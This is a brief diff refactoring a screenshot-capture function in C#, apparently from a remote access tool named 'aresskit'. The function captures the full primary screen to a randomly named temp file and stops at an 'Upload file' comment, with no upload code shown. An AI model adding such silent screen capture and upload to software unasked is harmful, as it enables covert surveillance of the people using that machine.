@@ -1,5 +1,4 @@
-﻿using System;
-using System.Drawing;
+﻿using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 
@@ -11,9 +10,8 @@ namespace aresskit
         public static string captureScreenshot()
         {
             string imagePath = default(string);
-            // ScreenShot.CaptureAndSave(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, @"C:\\development\\Capture.png");
             Bitmap myImage = Stream.Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            imagePath = System.IO.Path.GetTempPath() + Toolkit.RandomString(16) + ".png";
+            imagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
             myImage.Save(imagePath, ImageFormat.Png);
 
             // Upload file
